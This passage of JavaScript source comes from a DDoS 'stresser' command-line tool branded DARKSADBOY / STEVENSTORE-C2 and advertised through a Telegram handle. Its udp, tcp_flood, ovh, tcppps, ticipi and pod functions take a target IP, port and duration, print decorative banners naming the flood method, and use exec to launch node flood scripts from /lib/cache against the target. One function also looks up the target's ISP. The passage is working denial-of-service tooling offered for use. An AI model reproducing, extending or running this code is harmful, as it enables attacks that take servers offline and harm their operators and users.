⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : 𝑼𝑫𝑷 𝑲𝑰𝑳𝑳𝑬𝑹
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : 𝑺𝑻𝑬𝑽𝑬𝑵𝑺𝑻𝑶𝑹𝑬-𝑪2`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/udp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function tcp_flood(args) {
  if (args.length < 3) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: Tcp <𝑻𝒂𝒓𝒈𝒆𝒕> <𝑷𝒐𝒓𝒕> <𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏>
Tcp 123.456.78.910 22 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : 𝑻𝑪𝑷 𝑲𝑰𝑳𝑳𝑬𝑹
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : 𝑺𝑻𝑬𝑽𝑬𝑵𝑺𝑻𝑶𝑹𝑬-𝑪2`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/tcp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
async function ovh(args) {
  if (args.length < 3) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: Ovh <𝑻𝒂𝒓𝒈𝒆𝒕> <𝑷𝒐𝒓𝒕> <𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏>
Ovh 123.456.78.910 22 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : 𝑶𝑽𝑯 𝑲𝑰𝑳𝑳𝑬𝑹
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : 𝑺𝑻𝑬𝑽𝑬𝑵𝑺𝑻𝑶𝑹𝑬-𝑪2`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/ovh`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
async function tcppps(args) {
  if (args.length < 3) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: Tcp-Pps <𝑻𝒂𝒓𝒈𝒆𝒕> <𝑷𝒐𝒓𝒕> <𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏>
Tcp-Pps 123.456.78.910 22 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : 𝑻𝑪𝑷-𝑷𝑷𝑺 𝑲𝑰𝑳𝑳𝑬𝑹
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : 𝑺𝑻𝑬𝑽𝑬𝑵𝑺𝑻𝑶𝑹𝑬-𝑪2`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/tcppps`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
async function ticipi(args) {
  if (args.length < 3) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: Ticipi <𝑻𝒂𝒓𝒈𝒆𝒕> <𝑷𝒐𝒓𝒕> <𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏>
Ticipi 123.456.78.910 22 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : 𝑻𝑰𝑪𝑰𝑷𝑰 𝑲𝑰𝑳𝑳𝑬𝑹
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : 𝑺𝑻𝑬𝑽𝑬𝑵𝑺𝑻𝑶𝑹𝑬-𝑪2`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/ticipi`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
async function pod(args) {
  if (args.length < 2) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: Kill-Ping <𝑻𝒂𝒓𝒈𝒆𝒕> <𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏>
Kill-Ping 123.456.789.10 60`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.log(`
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
